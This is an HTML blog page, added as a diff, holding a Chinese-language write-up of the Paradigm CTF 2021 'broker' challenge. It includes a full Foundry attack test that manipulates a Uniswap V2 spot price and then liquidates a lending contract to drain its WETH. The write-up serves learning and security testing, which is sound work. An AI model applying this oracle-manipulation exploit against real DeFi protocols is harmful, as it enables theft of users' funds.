@@ -1,0 +1,676 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="LEVI_104" />
+  <meta name="description" content="始生有物，其形必丑" />
+  
+  
+  <title>
+    
+      04.broker 
+      
+      
+      |
+    
+     Sec Life
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="https://s1.vika.cn/space/2022/11/28/de7a2d4fa7ec48ef997fad1fb8af2fe0">
+    <link rel="icon" href="https://moe.photo/images/2023/06/29/d1b2faa44e90a63bb67cc7e990947a2.jpg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="https://moe.photo/images/2023/06/29/d1b2faa44e90a63bb67cc7e990947a2.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">LEVI_104</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">04.broker</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2023-08-11 12:31:56
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/19-Paradigm-CTF-2021/" title="19.Paradigm CTF 2021">
+                    <b>#</b> 19.Paradigm CTF 2021
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="broker"><a href="#broker" class="headerlink" title="broker"></a>broker</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="1-全局观"><a href="#1-全局观" class="headerlink" title="1.全局观"></a>1.全局观</h3><ul>
+<li>Broker.sol<ul>
+<li>IUniswapV2Pair：接口</li>
+<li>ERC20Like：接口</li>
+<li>WETH9：接口</li>
+<li>Broker：<ul>
+<li>属性：交易对池子、WETH、用于清算的token，记录存取款的mapping</li>
+<li>存款、取款、借款、还款</li>
+<li>清算机制：阈值是2/3</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Setup.sol<ul>
+<li>Token：ERC20合约，有空投方法（只能领取一次），除此之外只有转账和授权方法</li>
+<li>IUniswapV2Factory：接口</li>
+<li>Setup：<ul>
+<li>属性：WETH、UniswapV2Factory、用于清算的token、交易对池子、broker</li>
+<li>初始化题目</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="2-任务"><a href="#2-任务" class="headerlink" title="2.任务"></a>2.任务</h3><p>使得broker合约的WETH余额小于5 ether</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function isSolved() public view returns (bool) &#123;</span><br><span class="line">    return weth.balanceOf(address(broker)) &lt; 5 ether;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="3-详细分析"><a href="#3-详细分析" class="headerlink" title="3.详细分析"></a>3.详细分析</h3><h4 id="3-1资产与池子"><a href="#3-1资产与池子" class="headerlink" title="3.1资产与池子"></a>3.1资产与池子</h4><p>先看看题目初始化情况：初始化池子（比例为20_000: 1），broker合约资产情况初始化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">// create and bootstrap the token/weth pool for borrowing against WETH</span><br><span class="line">constructor() payable &#123;</span><br><span class="line">    // 本合约拥有 50 ether</span><br><span class="line">    require(msg.value == 50 ether);</span><br><span class="line">    // 本合约在WETH合约拥有 50 ether</span><br><span class="line">    weth.deposit&#123;value: msg.value&#125;();</span><br><span class="line"></span><br><span class="line">    // 新建一个用于清算的token</span><br><span class="line">    token = new Token();</span><br><span class="line">    // 创建交易对池子：WETH 和 Ltoken</span><br><span class="line">    pair = IUniswapV2Pair(factory.createPair(address(weth), address(token)));</span><br><span class="line">    // 创建Broker</span><br><span class="line">    broker = new Broker(pair, ERC20Like(address(token)));</span><br><span class="line">    // 本合约将一半的Ltoken转给broker</span><br><span class="line">    token.transfer(address(broker), 500_000 * DECIMALS);</span><br><span class="line"></span><br><span class="line">    // 1:25</span><br><span class="line">    // 本合约向池子转25WETH</span><br><span class="line">    weth.transfer(address(pair), 25 ether);</span><br><span class="line">    // 本合约向池子转2500_000个Ltoken</span><br><span class="line">    token.transfer(address(pair), 500_000 * DECIMALS);</span><br><span class="line">    // 此时池子的比例：500_000：25 = 20_000: 1</span><br><span class="line"></span><br><span class="line">    // 因为本合约提供了流动性，因此mint LPtoken给本合约</span><br><span class="line">    pair.mint(address(this));</span><br><span class="line"></span><br><span class="line">    // 本合约授权：broken可以操作本合约在WETH的资产</span><br><span class="line">    weth.approve(address(broker), type(uint256).max);</span><br><span class="line">    // 本合约在broker中存款25ether</span><br><span class="line">    broker.deposit(25 ether);</span><br><span class="line">    // 本合约在broker中取款250_000数量的Ltoken</span><br><span class="line">    broker.borrow(250_000 * DECIMALS);</span><br><span class="line"></span><br><span class="line">    // 总资产：broker的WETH余额 + broker在Ltoken的安全余额</span><br><span class="line">    totalBefore = weth.balanceOf(address(broker)) + token.balanceOf(address(broker)) / broker.rate();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们来捋一下资产情况：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th></th>
+<th>资产</th>
+<th>授权情况</th>
+<th>在Broker存款记录</th>
+<th>在Broker借款记录</th>
+<th>阈值</th>
+<th>健康状态</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Setup</td>
+<td>满额LPtoken, 250_000Ltoken</td>
+<td>WETH: broker==&gt; MAX</td>
+<td>deposited：25WETH</td>
+<td>debt：250_000Ltoken</td>
+<td>~333_333</td>
+<td>~16_666</td>
+</tr>
+<tr>
+<td>Broker</td>
+<td>250_000Ltoken, 25WETH</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>WETH</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>Ltoken</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>池子：</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th></th>
+<th>WETH</th>
+<th>Ltoken</th>
+<th>比例</th>
+<th>Broker的rate</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>池子</td>
+<td>25</td>
+<td>500_000</td>
+<td>20_000: 1</td>
+<td>20_000 * (2 / 3)~=13_333</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h4 id="3-2漏洞发掘"><a href="#3-2漏洞发掘" class="headerlink" title="3.2漏洞发掘"></a>3.2漏洞发掘</h4><p>了解了题目初始化的资产情况和池子的情况之后，我们很清楚我们该改什么，将Broker持有的25WETH减少到不足5WETH即可。那么在本题，肯定是利用池子进行操作。</p>
+<p>我们作为玩家，什么都没有，但我们可以获取Ltoken的空投，拿到这笔钱，就有干大事的可能性了哈哈。一个用户只能领取一次，一次10Ltoken，但是没有空投没有额度限制，就是说，我们可以创建多个账户，薅羊毛，然后再发到一个账户，理论上我可以获得无限的Ltoken。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function airdrop() public &#123;</span><br><span class="line">    require(!dropped[msg.sender], &quot;err: only once&quot;);</span><br><span class="line">    dropped[msg.sender] = true;</span><br><span class="line">    balanceOf[msg.sender] += AMT;</span><br><span class="line">    totalSupply += AMT;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我拥有无限的Ltoken，那么我就可以控制池子的价格：用Ltoken换WETH，使得WETH价格大涨，我拿到几乎25WETH，而池子中的WETH几乎归零。</p>
+<p>但这样跟我们想做的相反，WETH大涨，那么Setup就无法被清算，因此我们应该是增加池子中的WETH数量，导致WETH降价，从而被清算，还记得上一题，我们一开始就拥有5000ETH，那么我们可以全部换成WETH，然后控制池子的价格，让Setup被清算。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// 清算</span><br><span class="line">function liquidate(address user, uint256 amount) public returns (uint256) &#123;</span><br><span class="line">    // 负债大于质押，可清算</span><br><span class="line">    require(safeDebt(user) &lt;= debt[user], &quot;err: overcollateralized&quot;);</span><br><span class="line">    // 清算借款人的一定数量amount金额，用token清算</span><br><span class="line">    debt[user] -= amount;</span><br><span class="line">    token.transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    </span><br><span class="line">    // 清算人得到WETH，不过是得到 2/3 amount 的WETH</span><br><span class="line">    uint256 collateralValueRepaid = amount / rate();</span><br><span class="line">    weth.transfer(msg.sender, collateralValueRepaid);</span><br><span class="line">    return collateralValueRepaid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这么一来，空投那个函数便没有啥作用了，应该是用来迷惑玩家的。</p>
+<h4 id="3-3漏洞利用"><a href="#3-3漏洞利用" class="headerlink" title="3.3漏洞利用"></a>3.3漏洞利用</h4><p>让我们来计算一下应该怎么操纵价格.</p>
+<p>Setup借了250_000Ltoken，那么安全的价格根据公式<code>deposited[user] * rate() * 2 / 3</code>得到<code>rate()</code>为：15000，因此WETH的价格应该为15000个Ltoken或者更少，否则无法被清算。</p>
+<p>达到清算阈值之后，我们想办法清算一定数量，然后让Broker转出去20~25个代币即可，不能多也不能少，多了余额不足报错，少了完成不了题目。清算的时候Broker是这样计算转出去的WETH数量的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 清算人得到WETH</span><br><span class="line">// 实际清算的WETH数量 * WETH价格 = 清算的WETH数量</span><br><span class="line">// 那么，amount设置为：想要清算的数目n * rate() = y</span><br><span class="line">// amount / rate() = y / rate() = n * rate() / rate() = n</span><br><span class="line">// 这样就想扣除Broker多少WETH就扣除多少(n)</span><br><span class="line">uint256 collateralValueRepaid = amount / rate();</span><br><span class="line">weth.transfer(msg.sender, collateralValueRepaid);</span><br></pre></td></tr></table></figure>
+<p>因此，我们如果想要扣除Broker25个WETH，这么计算即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uint amount_liquidate = 25 ether * broker.rate();</span><br><span class="line">broker.liquidate(address(level), amount_liquidate);</span><br></pre></td></tr></table></figure>
+<p>控制价格的时候，要把价格控制到15000以下，选择一个合适的价格，并且在swap之后拥有足够数量的Ltoken，因为清算的时候需要足够的token。</p>
+<p>思路：</p>
+<ol>
+<li>存款ETH获得WETH</li>
+<li>在池子中交易：用WETH买Ltoken，导致WETH降价，Ltoken涨价</li>
+<li>清算</li>
+</ol>
+<h2 id="小插曲"><a href="#小插曲" class="headerlink" title="小插曲"></a>小插曲</h2><p>因为比赛已经过去，只能本地模拟它的比赛环境。在用foundry部署的时候，遇到了不少问题，也学到了不少：</p>
+<ul>
+<li>比赛的时候，给的WETH、factory、router地址是固定的，因此我需要重新部署一个uniswapV2系统。但这就导致了Broker计算价格的时候函数<code>rate()</code>顺序错误，然后在Setup合约初始化的时候<code>borrow()</code>报错。原因是：uniswapV2根据币对进行排序，我在本地部署出来的地址不一样，导致sort排序币对之后结果不一样，因此需要修改比对价格计算位置。</li>
+<li>进行swap的时候，一直显示EVM error revert问题，问题找了六七个小时，一步一步排查不断在UniswapV2的源代码中调试<code>require(false, &quot;test&quot;)</code>，最终，在router.B2library.sol中的pairFor计算币对地址的地方找到错误：Setup合约在<code>createPair()</code>的时候计算出来的地址和swap的时候进入library.<code>pairFor()</code>计算出来的结果不一样。原因是：library.<code>pairFor()</code>是利用CREATE2原理链下计算pair地址的，其中硬编码了bytecode的哈希值，但是，我部署的uniswapV2系统编译出来的bytecode然后hash得到的哈希值和uniswapV2官方的不一样，因此在swap的时候找不到币对然后报错EVM error revert。编译器版本相同、源代码相同，但是编译出来的bytecode也有可能不一样！</li>
+</ul>
+<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>因为是本地部署foundry模拟题目环境，因此题目的代码稍微改动了一点，但效果是差不多的，考点也一样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity 0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../../src/04.broker/Setup.sol&quot;;</span><br><span class="line">import &quot;./uniswapV2/erc20.sol&quot;;</span><br><span class="line">import &quot;./uniswapV2/factory.sol&quot;;</span><br><span class="line">import &quot;./uniswapV2/pair.sol&quot;;</span><br><span class="line">import &quot;./uniswapV2/router.sol&quot;;</span><br><span class="line">import &quot;./interface.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract attackTest is Test &#123;</span><br><span class="line">    string constant weth9_Artifact = &#x27;out/helper_WETH9.sol/WETH9.json&#x27;;</span><br><span class="line"></span><br><span class="line">    Setup public level;</span><br><span class="line">    IWETH9 public weth;</span><br><span class="line">    Broker public broker;</span><br><span class="line"></span><br><span class="line">    // uniswapV2系统</span><br><span class="line">    Iu_factory u_factory;</span><br><span class="line">    Iu_router u_router;</span><br><span class="line">    Token Ltoken;</span><br><span class="line">    IPair pair;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        // 创建WETH9合约</span><br><span class="line">        weth = IWETH9(deployHelper_weth(weth9_Artifact));</span><br><span class="line">        vm.label(address(weth), &quot;weth&quot;);</span><br><span class="line"></span><br><span class="line">        // 创建uniswapV2系统</span><br><span class="line"></span><br><span class="line">        // 部署u_factory</span><br><span class="line">        u_factory = Iu_factory(deployHelper_u_factory());</span><br><span class="line">        vm.label(address(u_factory), &quot;u_factory&quot;);</span><br><span class="line"></span><br><span class="line">        // 部署u_router</span><br><span class="line">        u_router = Iu_router(deployHelper_u_router(address(u_factory), address(weth)));</span><br><span class="line">        vm.label(address(u_router), &quot;u_router&quot;);</span><br><span class="line">        </span><br><span class="line">        // 初始化题目合约</span><br><span class="line">        level = new Setup&#123;value: 50 ether&#125;(address(weth), address(u_factory));</span><br><span class="line">        vm.label(address(level), &quot;level&quot;);</span><br><span class="line"></span><br><span class="line">        broker = level.broker();</span><br><span class="line">        vm.label(address(broker), &quot;broker&quot;);</span><br><span class="line">        Ltoken = level.token();</span><br><span class="line">        vm.label(address(Ltoken), &quot;Ltoken&quot;);</span><br><span class="line"></span><br><span class="line">        // 标记pair</span><br><span class="line">        pair = IPair(pairFor(address(u_factory), address(Ltoken), address(weth)));</span><br><span class="line">        vm.label(address(pair), &quot;pair&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_isComplete() public payable&#123;</span><br><span class="line">        </span><br><span class="line">        // 获得一些WETH，用来在池子里swap</span><br><span class="line">        uint256 amount_WETH = 25 ether;</span><br><span class="line">        weth.deposit&#123;value: amount_WETH&#125;();</span><br><span class="line"></span><br><span class="line">        console.log(&quot;==========before attack=========&quot;);</span><br><span class="line">        (uint112 reserve0_before, uint112 reserve1_before , uint32 z ) = pair.getReserves();</span><br><span class="line">        console.log(&quot;the pool&quot;);</span><br><span class="line">        console.log(&quot;   reserve0_WETH_before&quot;,reserve0_before);</span><br><span class="line">        console.log(&quot;   reserve1_Ltoken_before&quot;,reserve1_before);</span><br><span class="line">        console.log(&quot;My asset&quot;);</span><br><span class="line">        console.log(&quot;   WETH&quot;, weth.balanceOf(address(this)));</span><br><span class="line">        console.log(&quot;   Ltoken&quot;, Ltoken.balanceOf(address(this)));</span><br><span class="line">        console.log(&quot;WETH price&quot;, broker.rate());</span><br><span class="line">        console.log(&quot;liquidate&#x27;s WETH price 15000&quot;);</span><br><span class="line">        console.log(&quot;broker&#x27;s WETH&quot;, weth.balanceOf(address(broker)));</span><br><span class="line"></span><br><span class="line">        // 准备</span><br><span class="line">        weth.approve(address(broker), type(uint256).max);</span><br><span class="line">        weth.approve(address(u_router), type(uint256).max);</span><br><span class="line">        Ltoken.approve(address(broker), type(uint256).max);</span><br><span class="line">        Ltoken.approve(address(u_router), type(uint256).max);</span><br><span class="line"></span><br><span class="line">        // 把WETH换成Ltoken</span><br><span class="line">        address[] memory path = new address[](2);</span><br><span class="line">		path[0] = address(weth);</span><br><span class="line">		path[1] = address(Ltoken);</span><br><span class="line">		u_router.swapExactTokensForTokens(amount_WETH, 0, path, address(this), type(uint256).max);</span><br><span class="line"></span><br><span class="line">        console.log();</span><br><span class="line">        console.log(&quot;======after swap 25WETH for Ltoken======&quot;);</span><br><span class="line">        (uint112 reserve0_afterSwap, uint112 reserve1_afterSwap , uint32 zx ) = pair.getReserves();</span><br><span class="line">        console.log(&quot;the pool&quot;);</span><br><span class="line">        console.log(&quot;   reserve0_WETH_after&quot;,reserve0_afterSwap);</span><br><span class="line">        console.log(&quot;   reserve1_Ltoken_after&quot;,reserve1_afterSwap);</span><br><span class="line">        console.log(&quot;My asset&quot;);</span><br><span class="line">        console.log(&quot;   WETH&quot;, weth.balanceOf(address(this)));</span><br><span class="line">        console.log(&quot;   Ltoken&quot;, Ltoken.balanceOf(address(this)));</span><br><span class="line">        console.log(&quot;WETH price&quot;,broker.rate());</span><br><span class="line">        console.log(&quot;broker&#x27;s WETH&quot;,weth.balanceOf(address(broker)));</span><br><span class="line"></span><br><span class="line">        // 开始清算</span><br><span class="line">        uint amount_liquidate = 24 ether * broker.rate();</span><br><span class="line">        broker.liquidate(address(level), amount_liquidate);</span><br><span class="line"></span><br><span class="line">        console.log();</span><br><span class="line">        console.log(&quot;==========after liquidate=========&quot;);</span><br><span class="line">        (uint112 reserve0_afterLiquidate, uint112 reserve1_afterLiquidate , uint32 zzz ) = pair.getReserves();</span><br><span class="line">        console.log(&quot;the pool&quot;);</span><br><span class="line">        console.log(&quot;   reserve0_WETH_after&quot;,reserve0_afterLiquidate);</span><br><span class="line">        console.log(&quot;   reserve1_Ltoken_after&quot;,reserve1_afterLiquidate);</span><br><span class="line">        console.log(&quot;My asset&quot;);</span><br><span class="line">        console.log(&quot;   WETH&quot;, weth.balanceOf(address(this)));</span><br><span class="line">        console.log(&quot;   Ltoken&quot;, Ltoken.balanceOf(address(this)));</span><br><span class="line">        console.log(&quot;WETH price&quot;,broker.rate());</span><br><span class="line">        console.log(&quot;broker&#x27;s WETH&quot;,weth.balanceOf(address(broker)));</span><br><span class="line">        </span><br><span class="line">        assertEq(level.isSolved(), true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) &#123;</span><br><span class="line">        (address token0, address token1) = sortTokens(tokenA, tokenB);</span><br><span class="line">        </span><br><span class="line">        pair = address(uint160(uint256(keccak256(abi.encodePacked(</span><br><span class="line">                hex&#x27;ff&#x27;,</span><br><span class="line">                factory,</span><br><span class="line">                keccak256(abi.encodePacked(token0, token1)),</span><br><span class="line">                // 这个是我编译出来的bytecode的哈希值</span><br><span class="line">                hex&#x27;f0e60e1779ec5ef88ad36bab3e3e0cad28189353ab5bf1f719a2855de1c74e52&#x27; // init code hash</span><br><span class="line">            )))));</span><br><span class="line">    &#125;</span><br><span class="line">    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) &#123;</span><br><span class="line">        require(tokenA != tokenB, &#x27;UniswapV2Library: IDENTICAL_ADDRESSES&#x27;);</span><br><span class="line">        (token0, token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA);</span><br><span class="line">        require(token0 != address(0), &#x27;UniswapV2Library: ZERO_ADDRESS&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 部署WETH</span><br><span class="line">    function deployHelper_weth(string memory what) public returns (address addr) &#123;</span><br><span class="line">        bytes memory bytecode = vm.getCode(what);</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create(0, add(bytecode, 0x20), mload(bytecode))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 部署u_ERC20</span><br><span class="line">    function deployHelper_u_ERC20() public returns (address addr) &#123;</span><br><span class="line">        bytes memory bytecode = BYTECODE_erc20;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create(0, add(bytecode, 0x20), mload(bytecode))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 部署u_factory</span><br><span class="line">    function deployHelper_u_factory() public returns (address addr) &#123;</span><br><span class="line">        bytes memory bytecode = BYTECODE_factory;</span><br><span class="line">        // 构造器有参数</span><br><span class="line">        bytes memory bytecode_withConstructor = abi.encodePacked(bytecode, abi.encode(address(msg.sender)));</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create(0, add(bytecode_withConstructor, 0x20), mload(bytecode_withConstructor))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 部署u_router</span><br><span class="line">    function deployHelper_u_router(address _u_factory, address _weth) public returns (address addr) &#123;</span><br><span class="line">        bytes memory bytecode = BYTECODE_router;</span><br><span class="line">        // 构造器有参数</span><br><span class="line">        bytes memory bytecode_withConstructor = abi.encodePacked(bytecode, abi.encode(address(_u_factory), address(_weth)));</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create(0, add(bytecode_withConstructor, 0x20), mload(bytecode_withConstructor))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">E:.</span><br><span class="line">│  attackTest.sol</span><br><span class="line">│  helper_WETH9.sol</span><br><span class="line">│  interface.sol</span><br><span class="line">│  </span><br><span class="line">└─uniswapV2</span><br><span class="line">        erc20.sol</span><br><span class="line">        factory.sol</span><br><span class="line">        pair.sol</span><br><span class="line">        router.sol</span><br></pre></td></tr></table></figure>
